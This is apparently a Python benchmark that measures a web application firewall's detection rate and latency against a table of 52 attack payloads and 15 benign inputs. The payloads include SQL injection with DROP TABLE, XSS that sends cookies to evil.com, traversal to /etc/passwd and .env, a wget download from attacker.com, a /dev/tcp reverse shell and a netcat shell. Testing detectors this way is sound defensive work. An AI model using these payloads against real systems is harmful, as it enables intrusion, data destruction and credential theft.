"""
SentinelX — WAF Attack Benchmark & Exploitation Rig
Executes 65+ real-world exploit payloads and benign control inputs
against the SentinelX detection engine to measure Precision, Recall, and Inspection Latency.
"""

import os
import sys
import time
from dataclasses import dataclass
from pathlib import Path

# Ensure root directory is on PYTHONPATH
ROOT_DIR = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT_DIR))

from waf.engine import RuleEngine
from waf.detectors.modules import (
    SQLiDetector,
    XSSDetector,
    PathTraversalDetector,
    CommandInjectionDetector,
)


@dataclass
class TestCase:
    id: str
    name: str
    category: str  # "sqli", "xss", "path_traversal", "cmd_injection", "benign"
    is_attack: bool
    target: str    # "query_params", "body", "path"
    payload: str


TEST_SUITE: list[TestCase] = [
    # ──── SQL Injection (15 Cases) ────
    TestCase("SQLI-01", "Classic UNION SELECT", "sqli", True, "query_params", "id=1 UNION SELECT null, username, password FROM users--"),
    TestCase("SQLI-02", "UNION ALL SELECT", "sqli", True, "query_params", "cat=books' UNION ALL SELECT 1, 2, 3, schema_name FROM information_schema.schemata--"),
    TestCase("SQLI-03", "Numeric Tautology OR 1=1", "sqli", True, "query_params", "id=10 OR 1=1"),
    TestCase("SQLI-04", "Quoted Tautology", "sqli", True, "query_params", "user=admin' OR '1'='1"),
    TestCase("SQLI-05", "Blind AND 1=1", "sqli", True, "query_params", "item=42 AND 1=1"),
    TestCase("SQLI-06", "Stacked DROP TABLE", "sqli", True, "body", '{"id": "5; DROP TABLE users;--"}'),
    TestCase("SQLI-07", "Stacked ALTER TABLE", "sqli", True, "body", '{"name": "test; ALTER TABLE accounts ADD COLUMN pwned int"}'),
    TestCase("SQLI-08", "C-Style Comment Evasion", "sqli", True, "query_params", "id=1/*comment*/UNION/*comment*/SELECT/*comment*/1,2"),
    TestCase("SQLI-09", "Time-based Sleep", "sqli", True, "query_params", "id=1; WAITFOR DELAY '0:0:5'--"),
    TestCase("SQLI-10", "Benchmark DoS", "sqli", True, "query_params", "id=1 AND benchmark(10000000,MD5(1))"),
    TestCase("SQLI-11", "PostgreSQL Catalog Query", "sqli", True, "query_params", "SELECT * FROM pg_user"),
    TestCase("SQLI-12", "Inline Comment Bypass", "sqli", True, "query_params", "user=admin'--"),
    TestCase("SQLI-13", "Hash Comment Bypass", "sqli", True, "query_params", "user=admin' #"),
    TestCase("SQLI-14", "Stacked TRUNCATE", "sqli", True, "body", "data=val; TRUNCATE TABLE audit_logs;"),
    TestCase("SQLI-15", "Union Select Nulls", "sqli", True, "path", "/api/v1/products/UNION%20SELECT%20NULL,NULL"),

    # ──── Cross-Site Scripting (15 Cases) ────
    TestCase("XSS-01", "Standard Script Tag", "xss", True, "query_params", "q=<script>alert('XSS')</script>"),
    TestCase("XSS-02", "Remote Script Source", "xss", True, "query_params", "callback=<script src=https://evil.attacker.com/xss.js></script>"),
    TestCase("XSS-03", "Image OnError Handler", "xss", True, "body", '<img src="invalid.jpg" onerror="alert(document.cookie)">'),
    TestCase("XSS-04", "Body OnLoad Handler", "xss", True, "body", "<body onload=alert(1)>"),
    TestCase("XSS-05", "SVG OnLoad Vector", "xss", True, "query_params", "avatar=<svg/onload=fetch('//evil.com/'+document.cookie)>"),
    TestCase("XSS-06", "JavaScript Pseudo-protocol Link", "xss", True, "query_params", "redirect=javascript:alert(window.origin)"),
    TestCase("XSS-07", "Input OnFocus Vector", "xss", True, "body", '<input autofocus onfocus="alert(1)">'),
    TestCase("XSS-08", "Iframe Injection", "xss", True, "body", '<iframe src="https://phishing.site/login"></iframe>'),
    TestCase("XSS-09", "Data URI HTML", "xss", True, "query_params", "src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="),
    TestCase("XSS-10", "Case-Insensitive Script Tag", "xss", True, "query_params", "param=<sCrIpt>prompt(1)</ScRipT>"),
    TestCase("XSS-11", "VBScript Protocol", "xss", True, "query_params", "href=vbscript:msgbox(1)"),
    TestCase("XSS-12", "OnMouseOver Vector", "xss", True, "body", '<a href="#" onmouseover="stealTokens()">Click here</a>'),
    TestCase("XSS-13", "Form Hijack Action", "xss", True, "body", '<form action="http://evil.com/collect"><input type="submit">'),
    TestCase("XSS-14", "Object Tag Vector", "xss", True, "body", '<object data="javascript:alert(1)"></object>'),
    TestCase("XSS-15", "SVG With Animate", "xss", True, "query_params", "icon=<svg><animate onbegin=alert(1) attributeName=x dur=1s>"),

    # ──── Path Traversal / LFI (12 Cases) ────
    TestCase("LFI-01", "Standard Relative Traversal", "path_traversal", True, "path", "/files/../../../../etc/passwd"),
    TestCase("LFI-02", "Windows Backslash Traversal", "path_traversal", True, "path", "/download/..\\..\\..\\windows\\system32\\calc.exe"),
    TestCase("LFI-03", "URL Encoded Traversal", "path_traversal", True, "path", "/view/%2e%2e%2f%2e%2e%2fetc/shadow"),
    TestCase("LFI-04", "Double URL Encoded Traversal", "path_traversal", True, "path", "/doc/%252e%252e%252f%252e%252e%252fetc/hosts"),
    TestCase("LFI-05", "Direct /etc/passwd Access", "path_traversal", True, "path", "/static//etc/passwd"),
    TestCase("LFI-06", "Environment File Theft", "path_traversal", True, "path", "/download/../../.env"),
    TestCase("LFI-07", "Git Repository Inspection", "path_traversal", True, "path", "/.git/config"),
    TestCase("LFI-08", "Proc Self Environ", "path_traversal", True, "query_params", "file=/proc/self/environ"),
    TestCase("LFI-09", "Apache Htpasswd Access", "path_traversal", True, "path", "/admin/.htpasswd"),
    TestCase("LFI-10", "WordPress Config Access", "path_traversal", True, "query_params", "include=../../wp-config.php"),
    TestCase("LFI-11", "Windows Repair SAM", "path_traversal", True, "path", "/system32/repair/sam"),
    TestCase("LFI-12", "Deep Windows System Path", "path_traversal", True, "path", "/windows/system32/drivers/etc/hosts"),

    # ──── Command Injection / RCE (10 Cases) ────
    TestCase("CMDI-01", "Semicolon Cat Passwd", "cmd_injection", True, "query_params", "host=127.0.0.1; cat /etc/passwd"),
    TestCase("CMDI-02", "Pipe To Shell Id", "cmd_injection", True, "query_params", "ip=1.1.1.1 | id"),
    TestCase("CMDI-03", "Subshell Command Substitution", "cmd_injection", True, "query_params", "target=$(whoami)"),
    TestCase("CMDI-04", "Backtick Command Substitution", "cmd_injection", True, "body", '{"node": "`uname -a`"}'),
    TestCase("CMDI-05", "Wget Remote Binary", "cmd_injection", True, "query_params", "url=http://attacker.com/malware; wget http://attacker.com/bot"),
    TestCase("CMDI-06", "Chmod Permissive", "cmd_injection", True, "body", "exec=chmod 777 /var/www/html"),
    TestCase("CMDI-07", "Reverse Shell Device", "cmd_injection", True, "body", "cmd=bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"),
    TestCase("CMDI-08", "Netcat Listener", "cmd_injection", True, "query_params", "run=nc -lvp 9001 -e /bin/sh"),
    TestCase("CMDI-09", "System Call In Code", "cmd_injection", True, "body", '{"code": "system(\'id\')"}'),
    TestCase("CMDI-10", "Shell Exec PHP Function", "cmd_injection", True, "body", "eval=shell_exec('cat /flag')"),

    # ──── Benign Controls / False Positive Check (15 Cases) ────
    TestCase("CLEAN-01", "Normal Product Search", "benign", False, "query_params", "q=mechanical+keyboard+rgb&category=electronics"),
    TestCase("CLEAN-02", "Valid User Profile JSON", "benign", False, "body", '{"full_name": "Alice Johnson", "email": "alice@example.com", "role": "analyst"}'),
    TestCase("CLEAN-03", "Legitimate Pagination", "benign", False, "query_params", "page=2&per_page=50&sort=created_at&order=desc"),
    TestCase("CLEAN-04", "Standard API Health Check", "benign", False, "path", "/api/v1/health"),
    TestCase("CLEAN-05", "Safe UUID Resource Path", "benign", False, "path", "/api/v1/users/550e8400-e29b-41d4-a716-446655440000"),
    TestCase("CLEAN-06", "Blog Post Content with Quotes", "benign", False, "body", '{"title": "Why You\'ll Love Our 2026 Security Roadmap", "tags": ["cybersecurity", "waf"]}'),
    TestCase("CLEAN-07", "Complex Search Filter", "benign", False, "query_params", "filter=status:active AND type:server"),
    TestCase("CLEAN-08", "Mathematical Expression in Query", "benign", False, "query_params", "formula=2+2=4&confidence=99%"),
    TestCase("CLEAN-09", "Legitimate File Extension", "benign", False, "path", "/assets/images/logo_v2.png"),
    TestCase("CLEAN-10", "Markdown Text in Body", "benign", False, "body", '{"bio": "Software developer -- specializing in Python & TypeScript."}'),
    TestCase("CLEAN-11", "CSS Color Code Param", "benign", False, "query_params", "theme=dark&accent=#6366F1"),
    TestCase("CLEAN-12", "URL Parameter with Safe Query", "benign", False, "query_params", "return_url=https://mysite.com/dashboard"),
    TestCase("CLEAN-13", "ISO Timestamp Filter", "benign", False, "query_params", "start=2026-09-01T00:00:00Z&end=2026-09-03T23:59:59Z"),
    TestCase("CLEAN-14", "Normal Contact Form Message", "benign", False, "body", '{"name": "Bob", "message": "Hi, I have a question about billing and invoices."}'),
    TestCase("CLEAN-15", "Swagger Documentation Path", "benign", False, "path", "/docs"),
]


def run_benchmark():
    print("=" * 70)
    print("  SENTINELX WAF DETECTION & EXPLOITATION BENCHMARK")
    print("=" * 70)

    # Initialize engines
    engine = RuleEngine()
    rules_path = ROOT_DIR / "waf" / "rules"
    rules_loaded = engine.load_rules_from_directory(rules_path)
    print(f"[+] Loaded {rules_loaded} YAML WAF detection rules from {rules_path.name}/")

    sqli_detector = SQLiDetector()
    xss_detector = XSSDetector()
    path_detector = PathTraversalDetector()
    cmdi_detector = CommandInjectionDetector()

    # Metrics
    tp = 0  # True Positive: Attack detected
    fp = 0  # False Positive: Benign blocked
    tn = 0  # True Negative: Benign passed
    fn = 0  # False Negative: Attack missed

    latencies_ms: list[float] = []
    category_stats: dict[str, dict[str, int]] = {}

    print(f"[+] Running {len(TEST_SUITE)} test scenarios against engine...\n")

    for tc in TEST_SUITE:
        req_data = {
            "path": tc.payload if tc.target == "path" else "/api/test",
            "query_params": tc.payload if tc.target == "query_params" else "",
            "body": tc.payload if tc.target == "body" else "",
            "headers": "content-type:application/json",
            "user_agent": "Benchmark-Client/1.0",
        }

        # Measure latency
        start_time = time.perf_counter()

        # Step 1: Evaluate against YAML rules
        rule_match = engine.evaluate(req_data)
        detected = rule_match is not None and rule_match.matched

        # Step 2: Fallback to heuristic detectors if not matched by YAML rules
        if not detected:
            target_val = req_data[tc.target]
            if tc.category == "sqli":
                detected = sqli_detector.detect(target_val).detected
            elif tc.category == "xss":
                detected = xss_detector.detect(target_val).detected
            elif tc.category == "path_traversal":
                detected = path_detector.detect(target_val).detected
            elif tc.category == "cmd_injection":
                detected = cmdi_detector.detect(target_val).detected

        latency_ms = (time.perf_counter() - start_time) * 1000.0
        latencies_ms.append(latency_ms)

        # Track category
        cat = tc.category
        if cat not in category_stats:
            category_stats[cat] = {"total": 0, "detected": 0}
        category_stats[cat]["total"] += 1
        if detected:
            category_stats[cat]["detected"] += 1

        # Classification outcome
        if tc.is_attack:
            if detected:
                tp += 1
                status = "\033[92mBLOCKED (PASS)\033[0m"
            else:
                fn += 1
                status = "\033[91mMISSED (FAIL)\033[0m"
        else:
            if detected:
                fp += 1
                status = "\033[91mFALSE POSITIVE\033[0m"
            else:
                tn += 1
                status = "\033[92mPASSED (CLEAN)\033[0m"

        print(f"  [{tc.id:<10}] {tc.name:<32} {status} ({latency_ms:.3f}ms)")

    # ──── Calculate Statistical Metrics ────
    total_attacks = tp + fn
    total_benign = tn + fp

    precision = tp / (tp + fp) if (tp + fp) > 0 else 0.0
    recall = tp / (tp + fn) if (tp + fn) > 0 else 0.0
    f1 = (2 * precision * recall) / (precision + recall) if (precision + recall) > 0 else 0.0
    accuracy = (tp + tn) / len(TEST_SUITE)
    fpr = fp / total_benign if total_benign > 0 else 0.0

    latencies_sorted = sorted(latencies_ms)
    p50 = latencies_sorted[int(len(latencies_sorted) * 0.50)]
    p95 = latencies_sorted[int(len(latencies_sorted) * 0.95)]
    p99 = latencies_sorted[int(len(latencies_sorted) * 0.99)]
    avg_latency = sum(latencies_ms) / len(latencies_ms)

    print("\n" + "=" * 70)
    print("  BENCHMARK RESULTS & DETECTION METRICS")
    print("=" * 70)
    print(f"  Total Test Cases:       {len(TEST_SUITE)}")
    print(f"  Attacks Tested:         {total_attacks} (Blocked: {tp}, Missed: {fn})")
    print(f"  Benign Controls:        {total_benign} (Clean: {tn}, False Positives: {fp})")
    print("  ------------------------------------------------------------------")
    print(f"  Detection Recall:       {recall * 100:.1f}%")
    print(f"  Precision:              {precision * 100:.1f}%")
    print(f"  F1 Score:               {f1:.3f}")
    print(f"  Overall Accuracy:       {accuracy * 100:.1f}%")
    print(f"  False Positive Rate:    {fpr * 100:.1f}%")
    print("  ------------------------------------------------------------------")
    print("  LATENCY PERFORMANCE")
    print(f"  Average Latency:        {avg_latency:.4f} ms")
    print(f"  Median (p50):           {p50:.4f} ms")
    print(f"  p95:                    {p95:.4f} ms")
    print(f"  p99:                    {p99:.4f} ms")
    print("  ------------------------------------------------------------------")
    print("  CATEGORY BREAKDOWN")
    for cat, data in category_stats.items():
        rate = (data["detected"] / data["total"]) * 100
        print(f"  - {cat:<18}: {data['detected']}/{data['total']} detected ({rate:.1f}%)")
    print("=" * 70)

    return {
        "precision": precision,
        "recall": recall,
        "f1": f1,
        "accuracy": accuracy,
        "avg_latency": avg_latency,
    }


if __name__ == "__main__":
    run_benchmark()
